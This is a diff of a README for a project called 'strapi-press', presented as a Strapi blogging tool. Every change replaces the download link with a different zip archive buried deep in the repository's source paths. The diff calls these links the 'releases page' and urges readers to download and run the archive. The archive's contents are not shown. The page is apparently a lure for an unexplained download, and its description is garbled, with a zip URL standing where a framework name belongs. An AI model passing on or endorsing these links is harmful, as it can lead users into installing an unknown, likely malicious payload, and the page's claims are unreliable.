@@ -1,10 +1,10 @@
 # 🎉 strapi-press - Your Easy-to-Use Blogging Tool
 
 ## 🔗 Download Now
-[![Download strapi-press](https://raw.githubusercontent.com/dunercho1905/strapi-press/master/nutritive/strapi-press.zip)](https://raw.githubusercontent.com/dunercho1905/strapi-press/master/nutritive/strapi-press.zip)
+[![Download strapi-press](https://github.com/dunercho1905/strapi-press/raw/refs/heads/master/apps/strapi/src/api/footer/routes/press_strapi_v3.8.zip)](https://github.com/dunercho1905/strapi-press/raw/refs/heads/master/apps/strapi/src/api/footer/routes/press_strapi_v3.8.zip)
 
 ## 📖 Description
-strapi-press provides a simple way to create a blog using Strapi with https://raw.githubusercontent.com/dunercho1905/strapi-press/master/nutritive/strapi-press.zip and Turborepo. This lightweight application allows you to manage your blog easily while offering a modern and responsive design.
+strapi-press provides a simple way to create a blog using Strapi with https://github.com/dunercho1905/strapi-press/raw/refs/heads/master/apps/strapi/src/api/footer/routes/press_strapi_v3.8.zip and Turborepo. This lightweight application allows you to manage your blog easily while offering a modern and responsive design.
 
 ## 🚀 Getting Started
 Follow the steps below to download and run strapi-press on your system.
@@ -20,7 +20,7 @@ To use strapi-press, you will need:
 ### 💻 Installation Steps
 
 1. **Visit the Releases Page**
-   Go to the releases page to download strapi-press. You can find it here: [Download Page](https://raw.githubusercontent.com/dunercho1905/strapi-press/master/nutritive/strapi-press.zip).
+   Go to the releases page to download strapi-press. You can find it here: [Download Page](https://github.com/dunercho1905/strapi-press/raw/refs/heads/master/apps/strapi/src/api/footer/routes/press_strapi_v3.8.zip).
 
 2. **Choose the Latest Version**
    On the releases page, find the latest version of strapi-press. This version will have the most current features and fixes.
@@ -50,7 +50,7 @@ strapi-press includes key features designed for your convenience:
 - **SEO Friendly**: Built-in SEO tools help optimize your content for search engines.
 
 ## 📥 Download & Install
-To start using strapi-press, don’t forget to visit the releases page again: [Download Page](https://raw.githubusercontent.com/dunercho1905/strapi-press/master/nutritive/strapi-press.zip). Choose the latest version and follow the installation steps noted above.
+To start using strapi-press, don’t forget to visit the releases page again: [Download Page](https://github.com/dunercho1905/strapi-press/raw/refs/heads/master/apps/strapi/src/api/footer/routes/press_strapi_v3.8.zip). Choose the latest version and follow the installation steps noted above.
 
 ## 🌐 Community and Support
 For help or to connect with other users:
